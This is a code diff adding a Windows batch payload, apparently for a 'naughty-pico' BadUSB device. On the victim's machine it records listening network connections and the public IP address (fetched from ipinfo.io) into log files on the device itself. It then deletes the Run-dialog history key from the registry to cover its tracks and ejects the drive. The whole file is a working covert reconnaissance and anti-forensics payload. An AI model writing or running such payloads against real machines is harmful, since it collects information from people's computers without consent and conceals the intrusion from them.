@@ -1,0 +1,20 @@
+@echo off && cls
+::Begin of payload
+
+ ::IP-scan example begin
+ set self=%~d0\naughty-pico\
+ powershell.exe Get-NetTCPConnection -State Listen >> %self%private-ip.log
+ curl https://ipinfo.io >> %self%public-ip.log
+ ::End of scrape wifi info example
+
+::End of IP-scan example
+
+::Clear WIN + R buffer
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
+::
+
+::Eject naughty-pico
+mountvol %~d0 /p >nul 2>&1
+::
+
+exit
